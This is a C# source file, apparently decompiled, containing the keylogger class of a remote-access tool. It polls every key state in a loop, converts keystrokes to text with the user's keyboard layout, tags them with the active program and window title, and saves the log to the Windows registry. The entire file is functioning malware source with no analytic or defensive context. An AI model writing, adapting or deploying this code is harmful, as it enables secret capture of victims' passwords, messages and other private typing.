using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace w;

public class kl
{
	private string LastAS;

	private int LastAV;

	private Keys lastKey;

	public string Logs;

	public string vn;

	public kl()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		lastKey = (Keys)0;
		Logs = "";
		vn = "[kl]";
	}

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = OK.GetForegroundWindow();
			int b = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref b);
			Process processById = Process.GetProcessById(b);
			if (!(((foregroundWindow.ToInt32() == LastAV) & (Operators.CompareString(LastAS, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd ") + processById.ProcessName + " " + LastAS + "\u0001\r\n";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string Fix(Keys k)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Invalid comparison between Unknown and I4
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Invalid comparison between Unknown and I4
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Invalid comparison between Unknown and I4
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Invalid comparison between Unknown and I4
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Invalid comparison between Unknown and I4
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Invalid comparison between Unknown and I4
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Invalid comparison between Unknown and I4
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Invalid comparison between Unknown and I4
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Invalid comparison between Unknown and I4
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Invalid comparison between Unknown and I4
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Invalid comparison between Unknown and I4
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Invalid comparison between Unknown and I4
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Invalid comparison between Unknown and I4
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Invalid comparison between Unknown and I4
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Invalid comparison between Unknown and I4
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Invalid comparison between Unknown and I4
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Invalid comparison between Unknown and I4
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Invalid comparison between Unknown and I4
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Invalid comparison between Unknown and I4
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Invalid comparison between Unknown and I4
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Invalid comparison between Unknown and I4
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Invalid comparison between Unknown and I4
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d4: Expected I4, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected I4, but got Unknown
		bool flag = OK.F.get_Keyboard().get_ShiftKeyDown();
		if (OK.F.get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		string result;
		try
		{
			if (((int)k == 46 || (int)k == 8) ? true : false)
			{
				return "[" + ((Enum)k).ToString() + "]";
			}
			if (((int)k == 160 || (int)k == 161 || (int)k == 65536 || (int)k == 16 || (int)k == 131072 || (int)k == 17 || (int)k == 163 || (int)k == 162 || (int)k == 262144 || (int)k == 112 || (int)k == 113 || (int)k == 114 || (int)k == 115 || (int)k == 116 || (int)k == 117 || (int)k == 118 || (int)k == 119 || (int)k == 120 || (int)k == 121 || (int)k == 122 || (int)k == 123 || (int)k == 35) ? true : false)
			{
				return "";
			}
			if ((int)k == 32)
			{
				return " ";
			}
			if (((int)k == 13 || (int)k == 13) ? true : false)
			{
				if (Logs.EndsWith("[ENTER]\r\n"))
				{
					return "";
				}
				return "[ENTER]\r\n";
			}
			if ((int)k == 9)
			{
				return "[TAP]\r\n";
			}
			checked
			{
				if (flag)
				{
					return VKCodeToUnicode((uint)k).ToUpper();
				}
				result = VKCodeToUnicode((uint)k);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				string result2 = result;
				ProjectData.ClearProjectError();
				return result2;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int a);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int a);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] a);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint a, uint b);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder d, int e, uint f, IntPtr g);

	private static string VKCodeToUnicode(uint a)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			uint b = MapVirtualKey(a, 0u);
			int b2 = 0;
			IntPtr g = (IntPtr)GetKeyboardLayout(GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
			ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)a)).ToString();
	}

	public void WRK()
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(vn, "")));
		checked
		{
			try
			{
				while (true)
				{
					int num = 1;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !OK.F.get_Keyboard().get_CtrlKeyDown())
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("20") * 1024;
						if (Logs.Length > num3)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						OK.STV(vn, Logs, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
